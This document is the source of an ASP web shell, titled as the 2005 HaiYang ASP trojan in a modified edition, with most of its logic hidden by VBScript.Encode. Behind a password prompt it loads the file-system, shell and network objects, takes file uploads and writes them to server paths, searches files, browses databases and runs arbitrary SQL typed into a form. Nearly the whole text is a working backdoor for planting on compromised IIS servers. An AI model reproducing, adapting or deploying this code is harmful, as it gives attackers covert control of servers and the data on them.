   <%@ LANGUAGE="VBScript.Encode"  codepage ="936"
   <object runat=server id=objfsolhn scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
   <object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
   <object runat=server id=oScriptNetlhn scope=page classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
   <%if err then%>
   <object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
   <object runat=server id=oScriptNetlhn scope=page classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object>
   <%#@~^CwAAAA==@#@&+U9Pb0PXQIAAA==^#~@%>
   <style>
   BODY {SCROLLBAR-FACE-COLOR: #ffe1e8; FONT-SIZE: 9pt; SCROLLBAR-HIGHLIGHT-COLOR: #ffe1e8; SCROLLBAR-SHADOW-COLOR: #ff9dbb; COLOR: #f486a8; SCROLLBAR-3DLIGHT-COLOR: #ff97b9; SCROLLBAR-ARROW-COLOR: #ff6f8f; SCROLLBAR-TRACK-COLOR: #ffe1e8; SCROLLBAR-DARKSHADOW-COLOR: #ffd9e0}
   a:link {font-size: 9pt;color: #ff69b4;text-decoration: none;}
   a:visited {font-size: 9pt;color: #db7093;text-decoration: none;}
   a:hover {font-size: 9pt;color: #ffb6c1;text-decoration: none;}
   table {BORDER-COLLAPSE: collapse;border: 1px dotted #EFEFEF;font-size: 9pt;}
   .noborder {font-size: 9pt;border: none;}
   input {font-size: 9pt;color: #c875a5;background-image: letter-spacing: normal;vertical-align: middle;word-spacing: normal;white-space: normal;border: 1px dotted #c875a5;clear: both;height: auto;width: auto;background-repeat: repeat;overflow: hidden;}
   textarea {font-size: 9pt;background-image: letter-spacing: normal;vertical-align: middle;word-spacing: normal;clear:none;height: auto;width: auto;border: 1px dotted #c875a5;color: #c875a5;}
   </style>
   <META http-equiv=Content-Type content="text/html; charset=gb2312">
   <title>::::º£Ñô¶¥¶ËÍøASPÄ¾Âí£À2005¦Á°ævhack¸Ä°æ::::</title>
   response.buffer=true
   filename=Request.ServerVariables("URL")
   Server.ScriptTimeout=5000
   On Error Resume Next
   Dim oUpFileStream
   Class UpFile_Class
   Dim Form,File
   Public Sub GetDate (RetSize)
      '¶¨Òå±äÁ¿
     Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo
     Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
     Dim iFindStart,iFindEnd
     Dim iFormStart,iFormEnd,sFormName
      '´úÂë¿ªÊ¼
     If Request.TotalBytes < 1 Then
       Err = 1
       Exit Sub
     End If
     If RetSize > 0 Then
       If Request.TotalBytes > RetSize Then
       Err = 2
       Exit Sub
       End If
     End If
     Set Form = Server.CreateObject ("Scripting.Dictionary")
     Form.CompareMode = 1
     Set File = Server.CreateObject ("Scripting.Dictionary")
     File.CompareMode = 1
     Set tStream = Server.CreateObject ("Adodb.Stream")
     Set oUpFileStream = Server.CreateObject ("Adodb.Stream")
     oUpFileStream.Type = 1
     oUpFileStream.Mode = 3
     oUpFileStream.Open
     oUpFileStream.Write Request.BinaryRead (Request.TotalBytes)
     oUpFileStream.Position = 0
     RequestBinDate = oUpFileStream.Read
     iFormEnd = oUpFileStream.Size
     bCrLf = ChrB (13) & ChrB (10)
     'È¡µÃÃ¿¸öÏîÄ¿Ö®¼äµÄ·Ö¸ô·û
     sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1)
     iStart = LenB  (sSpace)
     iFormStart = iStart+2
     '·Ö½âÏîÄ¿
     Do
       iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3
       tStream.Type = 1
       tStream.Mode = 3
       tStream.Open
       oUpFileStream.Position = iFormStart
       oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart
       tStream.Position = 0
       tStream.Type = 2
       tStream.CharSet = "gb2312"
       sInfo = tStream.ReadText
       iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1
       iFindStart = InStr (22,sInfo,"name=""",1)+6
       iFindEnd = InStr (iFindStart,sInfo,"""",1)
       sFormName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
       If InStr  (45,sInfo,"filename=""",1) > 0 Then
         Set oFileInfo = new FileInfo_Class
         iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10
         iFindEnd = InStr (iFindStart,sInfo,"""",1)
         sFileName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
         oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1)
         oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\"))
         oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1)
         iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14
         iFindEnd = InStr (iFindStart,sInfo,vbCr)
         oFileInfo.FileType = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
         oFileInfo.FileStart = iInfoEnd
         oFileInfo.FileSize = iFormStart -iInfoEnd -2
         oFileInfo.FormName = sFormName
         file.add sFormName,oFileInfo
       else
   tStream.Close
         tStream.Type = 1
         tStream.Mode = 3
         tStream.Open
         oUpFileStream.Position = iInfoEnd
         oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2
         tStream.Position = 0
         tStream.Type = 2
         tStream.CharSet = "gb2312"
         sFormValue = tStream.ReadText
         If Form.Exists (sFormName) Then
           Form (sFormName) = Form (sFormName) & ", " & sFormValue
           else
           form.Add sFormName,sFormValue
         End If
       End If
       tStream.Close
       iFormStart = iFormStart+iStart+2
     Loop Until  (iFormStart+2) = iFormEnd
     RequestBinDate = ""
     Set tStream = Nothing
   End Sub
   End Class
   Class FileInfo_Class
   Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt
   Public Function SaveToFile (Path)
     On Error Resume Next
     Dim oFileStream
     Set oFileStream = CreateObject ("Adodb.Stream")
     oFileStream.Type = 1
     oFileStream.Mode = 3
     oFileStream.Open
     oUpFileStream.Position = FileStart
     oUpFileStream.CopyTo oFileStream,FileSize
     oFileStream.SaveToFile Path,2
     oFileStream.Close
     Set oFileStream = Nothing
   End Function
   Public Function FileDate
     oUpFileStream.Position = FileStart
     FileDate = oUpFileStream.Read (FileSize)
     End Function
   End Class
   %>
   <%#@~^qwAAAA==~b0~"+$E+kYvEwm/dhKD[s16J*xJ7tl1VEPDt x~@#@&d /dkKU`rwCdkhW.[^maJ*xrV^XJ,@#@&M+k2W    /nRM+[rM+mD~I ;E dORU+M\nD#CMkC4^n/vJi]dJ#~@#@&+s/ r6Pd /kkW    `r2lk/AWMNs^XJ#{EJDt+   ~@#@&dDcAAA==^#~@%>
   <FORM name="user" method="POST">
   <center><br><br><br><br><br><br><br><br><br><br>
   <FORM name="user" method="POST"> <INPUT TYPE=password NAME=passwordlcx style="border:1px solid #99CC00; "> <INPUT TYPE=Submit VALUE="º£Ñô¶¥¶ËÍøASPÄ¾Âí£À2005¦Á°æ" style="border:1px solid #99CC00; "> </form></center>
   <%#@~^BAAAAA==n^/nqQEAAA==^#~@%>
   <%#@~^RgIAAA==@#@&kW,D ;E /DcJ!wE#{JznkJPD4+    @#@&,~~/ Y,E2VGC9'U+S~jasrs {ZsCk/@#@&,~,E2^WmNRV+D9lD+~`8!+*CF!y*#@#@&P,~WWMP l^t~WKDh1mh+,kU~!wVGC9RWk^n@#@&~,Pk+Y,0bs+{E2VKl[ 6kV c0KD:gCh+*@#@&P~P~r6PWk^nRwksnUkyn@*ZPOt U@#@&7kl7+wmY4xEaVGl9RWGM:`rWk^+wmO4J*@#@&P~P~WbVnRUC\ KGobV+~dm\nwmO4@#@&iD /wKxknRSDrY PEÉÏ´«³É¹¦ZÉÏ´«ºóµÄÂ·¾¶Îªr[/m-+alY4'E@!(D@*J@#@&7. /2W   d+ch.rD+PE@!1+UY .@*@!8M@*@!lP4D W'rJ%l7ld^MkwDltb/YK.zR(l13c#IEr@*@!0KUY,mGsKD'v:G!T!ZTE@*·µ»ØÉÏÒ»Ò³@!J0KxY@*@!JC@*@!z^+   Yn.@*J@#@&~P,+x9~r0@#@&,P~/nO,0rV xxKY4r    o@#@&~,PU+XO@#@&~,Pk+Y,EasWmNxxKY4r o@#@&~P,/tKAnDM`*@#@&P~~M+dwKU/ RnU9@#@&nU9Pr0@#@&2KAAAA==^#~@%>
   <%#@~^ZQAAAA==@#@&0;    mDkW    PK;Yv#~@#@&IndaWxknR;WW0rn/vJald/AGMNE#{EJ@#@&.nkwWUd R.+9rM+^DPrJ[!D^'Jr@#@&2  N~o!xmDrW   MR4AAA==^#~@%>
   <%#@~^TwUAAA==v OR O OO O RO ORO OËÑË÷ÎÄ¼þº¯ÊýRR OO RO OO RRO O @#@&WU~ D.WM~D /;h PxnaD@#@&? CMm4UYMkxTP{~I ;;+kYcEU+lM^tUYDbULJ*@#@&mGEUO{!@#@&w;x1YrG    P?nCMm4sbs `~6~,/~,YbOV Pb@#@&?nO,0W,xPK4L6dGV4xcr2+UP 6Osbs+v0b@#@&mWUO xOP{~6W "+mNb^VE¶ÁÈ«²¿ÎÄ±¾µ½^W YnxD@#@&WKRZ^G/ @#@&UnCD1twks+~x,kU?D.`8~~^KxYnUD~~?B~74P 6DZWswm.+*@*TP,B´ÓµÚÒ»¸ö×Ö·û¿ªÊ¼¼ì²é^G    Y+  OÀïÃæÊÇ·ñÓÐ?@#@&q6~j+mD1toksn,K4+   vÈç¹ûÓÐ~ÔòÌá³öÎÄ¼þ:qPJA´æÈë±äÁ¿@#@&2GkF~',( ?OM`8~P1W   O+  YSPr@!P(:S2@*E~,\4:naY;WswCDnb@#@&2Wk+P{P(UUYDcqBP^W    O xOBPr@!z:q:J2@*JSP74PnXYZKhwmD+*@#@&YbY^+~'~Er@#@&q6~wK/q~@*P!~)  N~wKdyP@*,!,Kt xEÈ¡Pq:S3±ê¼ÇÖÐ¼äµÄ×Ö·û@#@&YrO^+P{~HbN`,^GxD+    YSP2GkF~_,{~,wGdyPO~2K/qP ~FPb@#@&AxN,q6@#@&Ax[P&0@#@&AxN,oE    mYbGU@#@&s!x^YrG    Pok^nSbxVc,0~~ObYs+,b@#@&-hlDtP{0cKlDtvÈ¡Â·¾¶@#@&qW~DkY^nP{PJr~Pt x,YrYsn,'~0cHls+v×öÁ´½Ó@#@&Bsrs Srx0~{PE@!b,CIAs{EJrP'P7nCO4P[,EJr@*J,'~YbY^+~[~E@!z)@*r@#@&wksndkxV~{P-nmO4P@#@&sbV+dk   VP{PE@!`S@*¡¤E,[PwrV Sk V~[,J@!ziS@*E@#@&3x9~s!x^ObWx@#@&UE8PUnmD^4sKVN Dv~09~~/,#@#@&6WE   [P{Psmsd+@#@&wW.PnC1t~0,(x,0[ wkVnd@#@&2Wk~{P(  ?DDI \vWRhlOtBPE rP#@#@&q6PwKd~@*,!,K4+U@#@&+aY,xPtk[c6RnCO4~~wKd,_~8P*@#@&AVkn@#@&+aY,'~Er@#@&AUN,q0@#@&(0,S;ld+cnXYbP{~Jm/2E,WD~J;ld+vnXYb,',Jlklr~WMPJZm/nc 6Y*~',Jm .EP,WMPJZCd `n6DbP{PE^96J~P4+U@#@&(6Pj lMmtwk^n`,0SPk~~ObYV ~#,Kt U@#@&"+kwGxdnc .kDnPwksndkxVc6~~YbO^+b@#@&1WE Y{^W!xO_8@#@&3  NP&W@#@&2x9~(0@#@&g+aY@#@&wW.P Cm4PdW9PqU~6N ?!8wWs9+M/@#@&? CD1toW^Nn.,/09SPk@#@&gnaY@#@&Ax[Pj;(BËÑË÷½áÊøE2EBAA==^#~@%>
   <%#@~^CwUAAA==v OR O OO O RO ORO ORR OO h/k;VµÄk5sÀ©Õ¹¿ªÊ¼O O ORORR ORO RO ORR OORR ORO R O@#@&fb:PkYMd;^~~W(L9$;Wx SPK4L"jSPbxDsr+s[;W;xDSPbxO/KExOnM~dYM^Kx@#@&/DDmKx,xYMkh`"+5; /YcWWM:`rdOD1W   Jb#@#@&kY./$sP{Y.rs`In5!+dYcWKDhvJUpSr#*@#@&b0~/DDj}dP@!@*~JrPl [~V1lk+cVnWD`ODbh`kY.d$V#S *#@!@*rd Vn1YrPK4+   @#@&"+dwKxdnc DbO+,J?5JÃüÁîlPrPLPdY.d$V~[,E³É¹¦ÔËÐÐ@!(D@*E,@#@&jnDPG4N9~ZG  x,'PU+M-+MR/D lOn}4L ^YvJbG69AcZKxU+^ObWUJ*@#@&,PG8NfA/G    x ran   PdDD1Wx@#@&,G4NN8mKxU  6+1;Y `/D.d;^#@#@&~W8%GA/W   UR;VGd PP~@#@&P~PUnDPG(LGAZKx   ~',1GY4kUL,@#@& UN,k0@#@&vO O ORORR ORO RO ORR OORR ORO R OR Êý¾Ý¿â¼ÇÂ¼ÁÐ±íO OO O RO ORO ORR OO RO OO RRO O ORORR O@#@&G$fMk-nMP'~EhDG\b[ Dxtk1DWkW6ORx+OR}S39~RccTiGlYm~jW!D1+xJ~@#@&/OD"GWDsGs9+D~x,?nD7nMR\mwhlY4`r&J*@#@&/1Dr2DxlsnP{PI 5;+kYc?nD-nM.CDbC4^+dcr?Z](hKm1z\AJb,P,P@#@&k6~D ;;+kYcEKwJ*xJ94J,CUN,D ;;+dOvJ[4   C: Jb@!@*JJ~C   N~D 5!+dD`rYl(V Uls+E#@!@*EE,Yt U@#@&N4 Ch+{YMkh`.n$En/DcJ94UCs+Jbb@#@&Ol(s xCs+{D+$E dYvJOl(VnUm:+rb@#@&?+D~G4NZKxUPx~U+.\ .R;DnCD+r8% mO`r)Gr9~R;Wx   +1OkKxE#@#@&rW,kxkODvN4 Ch+BJ&xWWxomVd+rb@*ZP~O4+x~@#@&W8L;G    x ;W    x+1YbGxUY.k o~x,N4  C: @#@& sd+@#@&K4%ZGU   R/W U+1YrG  ?Y.r    o~',9~f.b\ DPLP98xm:n@#@&+U[,k0,@#@&K4L;GUxcra+U@#@&j Y~W(%Km4sn"?Px~K4%ZKU R6a+    ?m4+sC`y!SbMDCzv2:aOXBP2s2OXBPA:2YzS,JPb~J2r#b@#@&k0~Om4s+  Cs+xrJ,Yt x,Ol(Vnxm:nxK4L:C4^+IUcEKm4^+m1Ch JbRjCV!+@#@&FXQBAA==^#~@%>
   <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
     <tr><td width="19%" align="center" valign="top"><a href="<%=#@~^CgAAAA==d1DraY    l: NgQAAA==^#~@%>?op=db&dbname=<%=#@~^GAAAAA==j D- DcjId2   ^W9+cN(xCh #nggAAA==^#~@%>"><%=#@~^HQAAAA==G(LWkW^txcM OsbVnxm:nc94xmh+*7AoAAA==^#~@%></a><br>
         <br>
         <table width="95%" border="0" cellspacing="0" cellpadding="6">
           <%#@~^GwAAAA==9KP   4k^+PgWD~W(LPl(Vn]UR2}oDQkAAA==^#~@%>
           <tr>
             <td><font size="4" face="Wingdings">3</font> <a href="<%=#@~^CgAAAA==d1DraY   l: NgQAAA==^#~@%>?op=db&dbname=<%=#@~^GAAAAA==j D- DcjId2   ^W9+cN(xCh #nggAAA==^#~@%>&tablename=<%=#@~^MAAAAA==j D- DcjId2 ^W9+cW(LPC(V+"j`rKl(sn{gls+E# #mV;+*hxAAAA==^#~@%>"><%=#@~^HgAAAA==G(LPm4^+IU`rPl(Vn{glhnr#RjCV!+UAoAAA==^#~@%></a></td>
           </tr>
           <%#@~^HQAAAA==G(LPm4^+IURtG\ 1n6D@#@&7iSWK27wgAAA==^#~@%>
         </table>
       </td>
       <td width="81%" valign="top">
         <table width="100%" border="0" cellspacing="0" cellpadding="0">
           <tr valign="top">
             <td align="center" valign="top"><font color="#330099"><%=#@~^CQAAAA==Om4s xm:+qQMAAA==^#~@%></font>
               <form action="<%=#@~^CgAAAA==d1DraY l: NgQAAA==^#~@%>" method="post" name="sqlcmd" id="sqlcmd">
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
                   <tr valign="top">
                     <td align="center"> <input name="cmd" type="text" id="cmd" size="60">
                       <input name="op" type="hidden" id="op" value="sql"> <input name="dbname" type="hidden" id="dbname" value="<%=#@~^EQAAAA==. ;; /D`J94    C: JbBQYAAA==^#~@%>">
                       <input type="submit" value="Ö´ÐÐSQL"></td></tr></table></form> </td></tr></table>
   <table width="100%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
   <tr bgcolor="#CCCCCC" align="center" valign="top">
   <%#@~^SQEAAA==[b:~sXk;VBkB%@#@&LxF@#@&hzk;V{E? V+1O~KKw,FTPM~wDG:,,JLYC8^+xCh [ETr@#@&?nDPK4L"?{G4NZGx  R3a mEDn`sX/$sb@#@&sKD~kxT,YGPK8L"/ ob+V[dcZGE  O F@#@&I /wKxknRSDrY J@!O9@*@!(@*JLW4N]jRwk V[/cr*RUlsn[r@!&8@*@!zO[@*J@#@&gnXY@#@&I /wKxknRSDrY PE@!JYD@*E@#@&k0,G8LM/c+G0~O4+U@#@&nVk+@#@&GrP 4bVnPg6:PG(L"?RAW6@#@&"+dwKxdnchDbO+,J@!D.@*J@#@&c1wAAA==^#~@%>
   <%#@~^1gEAAA==@#@&sGMPb'!,YK~W(L]/csrn^N/c/W!xY q@#@&"+kwGxdnch.kDnJ@!Y[@*r@#@&(W,qd1!s^`G(L"/Rwk sNk`r#c\Cs!+#,GD,W4N]dRwk V[/cr*R-l^;+{JE~KDPG8NIdRwr V[k`b#R7l^;+{J~J,Y4n    @#@&Mn/aWxkn hMkD+~J'U(/2ir@#@& Vdn@#@&P~] /2W  d RAMkD+PU+M-+MRuKtS3U1WN cW(LIk ok V9/ckb 7lsE b@#@&PnU9PkW@#@&In/aG   /nchMkY J@!&Y9@*E@#@&1naD@#@&"n/aWxkn hMkD+E@!&OM@*E@#@&G4NIj tW\nH 6O@#@&%{LQ8@#@&SWKw@#@&+    N~k6@#@&d YPK8L"/P{~UWDtbxL@#@&d Y~W(%Km4sn"?Px~    WOtbUT@#@&K4NZW xc/VK/n@#@&/nO,W4N/W    xP{~UWDtbxL@#@&5YkAAA==^#~@%>
   </table>
   <p>×î¶àÏÔÊ¾10Ìõ¼ÇÂ¼£¬Òª²ì¿´¸ü¶à¼ÇÂ¼ÇëÊ¹ÓÃSQLÃüÁî</p><br>
   </table>
   <%#@~^HgAAAA==@#@&InkwKx/ RAUN@#@&nx9PrW@#@&/wYAAA==^#~@%>
   <%#@~^EQIAAA==@#@&BR O OO O RO ORO ORR OO RO OOÊý¾Ý¿â¶ÔÏóÁÐ±í RRO O ORORR ORO RO ORR OORR ORO R OR O OO O @#@&b0~D ;;nkY`rGwr#'r[8J,l   N~Dn5!+dYvEN(xCh J#@!@*rJ~Y4n   @#@&94  l: 'D.ks`.+$EndD`J98xm:+rbb@#@&? Y~W8%;WUx,xPU+.- DR/. lO+}8N+^D`rbf}f~ ZKxU+1YrG   J#@#@&BK4L;GUxcZKxU+^ObWU?D.k   o~x,fA9.b\nD,',N8   ls+@#@&k6~k /ODvN8Um:+BEq   0W{oCVk+r#@*!~~Dtnx,@#@&K4%/Kxx /KxU+1ObWUUYMkxTP{~N(xC: @#@&n^/+@#@&W(LZKUUR;W xnmOrKxjYMrxTPx~GAf.r7+.PL~94Um: @#@& x9~k6P@#@&K4%/Kxxc6w x@#@&jnY,W(LPl8s IjP{~W(L/G  xR62 xjm4nslcy!BbDMlHc2swOXBP3haYXB~2swYHS~J:b~S3Jbb@#@&6JQAAA==^#~@%>
   <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
     <tr>
       <td width="19%" align="center" valign="top"><a href="<%=#@~^CgAAAA==d1DraY  l: NgQAAA==^#~@%>?op=db&dbname=<%=#@~^BgAAAA==[(xCs+ZwIAAA==^#~@%>"><%=#@~^HQAAAA==G(LWkW^txcM OsbVnxm:nc94xmh+*7AoAAA==^#~@%></a><br>
         <br>
         <table width="95%" border="0" cellspacing="0" cellpadding="6">
           <%#@~^GwAAAA==9KP   4k^+PgWD~W(LPl(Vn]UR2}oDQkAAA==^#~@%>
           <tr>
             <td><font size="4" face="Wingdings">3</font> <a href="<%=#@~^CgAAAA==d1DraY   l: NgQAAA==^#~@%>?op=db&dbname=<%=#@~^GAAAAA==j D- DcjId2   ^W9+cN(xCh #nggAAA==^#~@%>&tablename=<%=#@~^MAAAAA==j D- DcjId2 ^W9+cW(LPC(V+"j`rKl(sn{gls+E# #mV;+*hxAAAA==^#~@%>"><%=#@~^HgAAAA==G(LPm4^+IU`rPl(Vn{glhnr#RjCV!+UAoAAA==^#~@%></a></td>
           </tr>
           <%#@~^NwAAAA==G(LPm4^+IURtG\ 1n6D@#@&7iSWK2@#@&ddK8%Km4^+]? \K\nsb./DrRAAAA==^#~@%>
         </table>
       </td>
       <td width="81%" align="center" valign="top"><a href="<%=#@~^CgAAAA==d1DraY  l: NgQAAA==^#~@%>?op=sql&dbname=<%=#@~^BgAAAA==[(xCs+ZwIAAA==^#~@%>">Ö´ÐÐSQLÃüÁî<br>
         </a>
         <%#@~^GAAAAA==    4ks PgWY,W(%Km4s+"? 3}sOggAAA==^#~@%>
         <table width="98%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
           <tr align="center" bgcolor="#FFFFCC">
             <td colspan="6"><font color="#660000" size="2"><b><%=#@~^HgAAAA==G(LPm4^+IU`rPl(Vn{glhnr#RjCV!+UAoAAA==^#~@%></b></font></td>
           </tr> <tr align="center">  <td>×Ö¶ÎÃû</td> <td>Êý¾ÝÀàÐÍ</td><td>×Ö¶Î´óÐ¡</td><td>¾«¶È</td><td>ÊÇ·ñÔÊÐíÎª¿Õ</td><td>Ä¬ÈÏÖµ</td> </tr> <tr>
           <%#@~^QwIAAA==j Y~K4NZW^EsUIUPxPK4%/Kxxc6w x?14n:m`W~)D.CH`3:aOXBP3haYXS~K4%Km8^+]U`rKl(V m1m:nJ*R#C^E+*b@#@&PP,~~P,PqtrVn~gWOPK8L;Ws;sxIj Aro@#@&~,P~,P,Pkd+   LY4PxPK4%/KVEsUIU`J;4CDmmD+.{\CXkhEsmS xLO4J#@#@&idrnMn1kdbW    P',W(%ZKV;: Ijcr1EsnDbm{h.nmb/bWUJb7@#@&7P,~P,P~~,PP~rUmCV ~{PG(L;WV!:  ]?vJHEs+.r1{?1CV J#@#@&7dbf 0CEsOjlsE ~',W8%;WV;h   Ij`r/KV;sx|f+6l!sYr#@#@&,P~~,PP,~P,PP,7(0,qk1;VscbSnxTOt*PO4 xPrJ xLY4~{PELx(/wpJi@#@&iP~P,P~~,PP,~q6PqkH;V^`bn.+^rkkGx*~Y4+U~bnDn^b/rW ~{PELx(/wpJ@#@&diqWP&/H;^V`bjmmV+*~Ot x,kjmCs PxPr'x(/2Ir@#@&77&0~qkH!VsvkG+0mE^O.mV;+*PO4 xPb9+6lE^O#l^E PxPE' 4dwpEUawAAA==^#~@%>
             <td width="29%" height="8"><%=#@~^GgAAAA==G(L/KV!:x"?vEZKV;:  {HCs+J*MQkAAA==^#~@%></td>
             <td width="12%" height="8"><%=#@~^IwAAAA==Wb+s9YHw+vW(%ZKV;:  IjcrflDC{:Xw Eb#dQwAAA==^#~@%></td>
             <td width="11%" height="8"><%=#@~^BwAAAA==rd+UTY4ywIAAA==^#~@%></td>
             <td width="9%" height="8"><%=#@~^CgAAAA==rhDn1kkkW    FQQAAA==^#~@%></td>
             <td width="17%" align="center" height="8">
               <%#@~^fQAAAA==(6PG(L;WV!:   ]?vJ(/|1;s^l4^nJ*PY4nU@#@&did]+d2Kxd+c  DbYn~rÊÇJ@#@&~,P~P,~,P~,P V/ @#@&~P,P~P,P~~,PI dwKx/  ADbY PE·ñJ@#@&id3x9~q62x4AAA==^#~@%>
             </td>
             <td width="22%" height="8"><%=#@~^DQAAAA==rG+WmE^Y.mV!nKwUAAA==^#~@%></td>
           </tr>
           <%#@~^1AAAAA==G(L/KV!:x"?c\W7+H+XY@#@&i +   [@#@&dW(%Pl(V IjR\G7+H+XO@#@&djnDPW8%;WsEsU"?~{PgWY4k   L@#@&In/aWUd RhMrY PJ@!8.@*r@#@& nx[@#@&W8L:C4^+]jcZVGd @#@&? O,W8NKm4V IU~',1GY4kUL@#@&W(%ZKxxc/sWk+@#@&j+O~K4%ZKUx,'~HKYtrUT@#@&7T0AAA==^#~@%>
    </table> </td> </table>
   <%#@~^HgAAAA==@#@&InkwKx/ RAUN@#@&nx9PrW@#@&/wYAAA==^#~@%>
   <%#@~^/QEAAA==@#@&BR O OO O RO ORO ORR OO RO OOÖ´ÐÐU}JÃüÁîO O ORORR ORO RO ORR OORR ORO R OR O OO O RO @#@&k6P.n$E+kO`rWwrbxJk;^J~Y4n   @#@&N(Uls+xOMk:c. ;;+kOvJ[(xm:+r#*@#@&U+OPK4%/Kxx,xPU+D7n.R;D lO+68N+^YvEbGr9$cZWUU mOkKUr#@#@&BK4L;W   UR;WUx mOrKx?D.k    oP{~9AGDb\nD~',N8xmh+@#@&rW,kxdOM`[4    Cs+Srq  0W{sms/ Jb@*ZP~O4+x,@#@&K4L;GUxcZKxU+^ObWU?D.k  o~x,N4UCs+@#@& sk+@#@&W(LZKx     ZKxU+1YrG  ?YMrxTP',9$fMk7+.P'~94Ulsn@#@&+U[,k0~@#@&W8L;G  x }w x@#@&? OPK4%Km4sn"?P{~W(LZKUUR}w xjm4nslc ZSbMDCzv2:2OH~~2s2DXS,2swYH~,EKzAJ2r#b@#@&L'Z@#@&Go8AAA==^#~@%>
   <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
     <tr>
       <td width="13%" align="center" valign="top"><a href="<%=#@~^CgAAAA==d1DraY  l: NgQAAA==^#~@%>?op=db&dbname=<%=#@~^GAAAAA==j D- DcjId2   ^W9+cN(xCh #nggAAA==^#~@%>"><%=#@~^HQAAAA==G(LWkW^txcM OsbVnxm:nc94xmh+*7AoAAA==^#~@%></a><br>
         <br>
         <table width="95%" border="0" cellspacing="0" cellpadding="6">
           <%#@~^GwAAAA==9KP   4k^+PgWD~W(LPl(Vn]UR2}oDQkAAA==^#~@%>
           <tr>
             <td><font size="4" face="Wingdings">3</font> <a href="<%=#@~^CgAAAA==d1DraY   l: NgQAAA==^#~@%>?op=db&dbname=<%=#@~^GAAAAA==j D- DcjId2   ^W9+cN(xCh #nggAAA==^#~@%>&tablename=<%=#@~^MAAAAA==j D- DcjId2 ^W9+cW(LPC(V+"j`rKl(sn{gls+E# #mV;+*hxAAAA==^#~@%>"><%=#@~^HgAAAA==G(LPm4^+IU`rPl(Vn{glhnr#RjCV!+UAoAAA==^#~@%></a></td>
           </tr>
           <%#@~^HQAAAA==G(LPm4^+IURtG\ 1n6D@#@&7iSWK27wgAAA==^#~@%>
         </table>
       </td>
       <td width="87%" align="center" valign="top">
         <form action="<%=#@~^CgAAAA==d1DraY   l: NgQAAA==^#~@%>" method="post" name="sqlcmd" id="sqlcmd">
         <table width="100%" border="0" cellspacing="0" cellpadding="0">
           <tr valign="top">
             <td align="center">
                   <input name="cmd" type="text" id="cmd" size="60">
                 <input name="op" type="hidden" id="op" value="sql">
                 <input name="dbname" type="hidden" id="dbname" value="<%=#@~^EQAAAA==. ;; /D`J94  C: JbBQYAAA==^#~@%>">
                 <input type="submit" value="Ö´ÐÐSQL"></td>
           </tr>
         </table>
         </form>
         <table width="100%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
           <tr bgcolor="#CCCCCC" align="center" valign="top">
   <%#@~^GAEAAA==r6P. ;!+/D`r^:9Jb@!@*JE~Dt+   @#@&sX/$sxD ;!+dYcE1:[J*@#@&U+O~K4L]j{W8L;G x A6 mED+vhXk;s#@#@&rW,W4N./c/YmOnP{P8POtnU,@#@&sK.Pb'T~DWPG8NIdRwr V[kR;WE Y q@#@&In/aWUd RhMrY J@!D[@*@!(@*r[G4%]URok sNk`rbcxlhnLJ@!z(@*@!zO9@*r@#@&g+XO@#@&In/aWUd RhMrY PJ@!&OD@*J@#@&r0~G(L./cnW6PO4 x@#@&FVAAAA==^#~@%>
   <%#@~^PQAAAA==n^/n@#@&GrPqtbs+,16K,W8%"?RAG0@#@&I d2W   / RADrO PE@!D.@*r@#@&XxAAAA==^#~@%>
   <%#@~^6gEAAA==@#@&sGMPb'!,YK~W(L]/csrn^N/c/W!xY q@#@&"+kwGxdnch.kDnJ@!Y[@*r@#@&(W,qd1!s^`G(L"/Rwk sNk`r#c\Cs!+#,GD,W4N]dRwk V[/cr*R-l^;+{JE~KDPG8NIdRwr V[k`b#R7l^;+{J~J,Y4n    @#@&Mn/aWxkn hMkD+~J'U(/2ir@#@& Vdn@#@&P~] /2W  d RAMkD+PU+M-+MRuKtS3U1WN cW(LIk ok V9/ckb 7lsE b@#@&PnU9PkW@#@&In/aG   /nchMkY J@!&Y9@*E@#@&1naD@#@&"n/aWxkn hMkD+E@!&OM@*E@#@&G4NIj tW\nH 6O@#@&%{LQ8@#@&SWKw@#@&+    N~k6@#@&d YPK8L"/P{~UWDtbxL@#@&n    N~k6@#@& x[~b0@#@&d Y~W(%:l8^+"?P{P GY4kUo@#@&G8NZW UR;VWkn@#@&k+DPG4%/KxUP{~xKY4r  o@#@&X44AAA==^#~@%>
        </table>
         <br>
